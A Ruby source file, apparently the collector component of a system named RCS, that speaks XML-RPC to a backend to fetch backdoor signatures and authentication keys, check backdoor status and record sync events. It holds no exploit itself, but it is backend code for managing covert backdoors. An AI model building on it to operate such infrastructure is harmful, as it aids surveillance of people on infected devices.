#
#  DB layer for XML-RPC communication
#

# from RCS::Common
require 'rcs-common/trace'

# system
require 'xmlrpc/client'
require 'pp'

module RCS
module Collector

class DB_xmlrpc
  include RCS::Tracer

  def initialize(host)
    @host, @port = host.split(':')

    # create the xml-rpc server
    @server = XMLRPC::Client.new(@host, '/server.php', @port, nil, nil, nil, nil, true)

    # we need to set an attribute inside the http instance variable of @server
    # we can get a reference here and manipulate it later
    http = @server.instance_variable_get(:@http)

    # no SSL verify for this connection
    #http.verify_mode = OpenSSL::SSL::VERIFY_NONE

    # CA certificate to check if the server ssl certificate is valid
    http.ca_file = Dir.pwd + "/config/rcs-client.pem"

    # our client certificate to send to the server
    http.cert = OpenSSL::X509::Certificate.new(File.read(Dir.pwd + "/config/rcs-client.pem")) 

    trace :debug, "Using XML-RPC to communicate with #{@host}:#{@port}"
  end

  # log in to the database
  # returns a boolean
  def login(user, pass)
    begin
      response = @server.call('auth.login', user, pass)
      return true
    rescue Exception => e
      trace :error, "Error calling auth.login: #{e.message}"

      # we can get a "method not found" error only if we are already logged in
      # in this case, we force a logout and retry the login
      if e.faultCode == -32601 then  # -32601 is METHOD NOT FOUND
        trace :debug, "forcing logout and retrying..."
        logout
        return login(user, pass)
      end
      
      return false
    end
  end

  def logout
    begin
      response = @server.call('auth.logout')
      trace :debug, "XML-RPC logout: #{response}"
      return true
    rescue Exception => e
      trace :error, "Error calling auth.logout: #{e.message}"
      return false
    end
  end

  def update_status(component, remoteip, status, message, disk, cpu, pcpu)
    begin
      @server.call('monitor.set', component, remoteip, status, message, disk, cpu, pcpu)
    rescue Exception => e
      trace :error, "Error calling monitor.set: #{e.message}"
    end
  end

  # per customer signature
  def backdoor_signature
    begin
      return @server.call('sign.get', "backdoor")
    rescue Exception => e
      trace :error, "Error calling sign.get: #{e.message}"
    end
  end

  # used to authenticate the backdoors
  def class_keys(build_id = '')
    begin
      list = @server.call('backdoor.getclasskey', build_id)
      # if we are are requesting a specific build_id, return only the key
      return list[0]['classkey'] if build_id.length > 0

      # otherwise return all the results by converting
      # the response into an hash indexed by 'build'
      class_keys = {}
      list.each do |elem|
        class_keys[elem['build']] = elem['classkey']
      end
      return class_keys
    rescue Exception => e
      trace :error, "Error calling backdoor.getclasskey: #{e.message}"
    end
  end

  # backdoor identify
  def status_of(build_id, instance_id, subtype)
    begin
      ret = @server.call('backdoor.identify', build_id, instance_id, subtype)
      bid = ret['backdoor_id']
      if ret['deleted'] == 1 then
        return DB::DELETED_BACKDOOR, bid
      end
      case ret['status']
        when 'OPEN'
          return DB::ACTIVE_BACKDOOR, bid
        when 'QUEUED'
          return DB::QUEUED_BACKDOOR, bid
        when 'CLOSED'
          return DB::CLOSED_BACKDOOR, bid
      end
    rescue Exception => e
      trace :error, "Error calling backdoor.identify: #{e.message}"

      # 1702 is NO SUCH BACKDOOR
      if e.respond_to?(:faultCode) and e.faultCode == 1702 then
        return DB::NO_SUCH_BACKDOOR, 0
      end
    end
  end

  # the sync date is sent to the database here
  def sync_for(bid, version, user, device, source, time)
    begin
      @server.call('backdoor.sync', bid, source, user, device, version, time)
    rescue Exception => e
      trace :error, "Error calling backdoor.sync: #{e.message}"
    end
  end

end #

end #Collector::
end #RCS::